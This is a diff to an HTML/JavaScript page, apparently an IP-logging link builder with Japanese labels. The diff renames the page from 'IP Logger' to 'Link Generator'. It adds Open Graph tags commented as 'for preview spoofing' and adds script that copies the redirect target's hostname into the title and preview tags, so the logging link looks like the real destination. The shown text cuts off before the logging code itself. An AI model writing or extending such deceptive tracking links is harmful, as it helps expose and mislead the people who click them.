@@ -4,7 +4,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Logger</title>
+    <title id="page-title">Loading...</title>
+    <!-- OGP tags for preview spoofing -->
+    <meta property="og:title" id="og-title" content="Loading">
+    <meta property="og:description" id="og-desc" content="Redirecting to destination...">
     <style>
         body { background: #0f172a; color: #f8fafc; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #1e293b; padding: 2rem; border-radius: 8px; width: 450px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
@@ -16,7 +19,7 @@
 </head>
 <body>
     <div class="card" id="builder-view">
-        <h2>IP Logger</h2>
+        <h2>Link Generator</h2>
         <div class="section">
             <label>リダイレクト先 URL:</label>
             <input type="text" id="redirect" placeholder="https://example.com">
@@ -36,7 +39,15 @@
         const targetRedirect = urlParams.get('to');
 
         if (targetRedirect) {
-            document.body.innerHTML = '<div style="background:#0f172a;color:#f8fafc;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;"><p>Redirecting...</p></div>';
+            // リダイレクト先をタイトルやメタタグに反映して偽装
+            try {
+                const parsedUrl = new URL(targetRedirect);
+                document.getElementById('page-title').innerText = parsedUrl.hostname;
+                document.getElementById('og-title').setAttribute('content', parsedUrl.hostname);
+                document.getElementById('og-desc').setAttribute('content', targetRedirect);
+            } catch (e) {}
+
+            document.body.innerHTML = '<div style="background:#0f172a;color:#f8fafc;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;"><p>読み込み中...</p></div>';
             
             (async function() {
                 try {
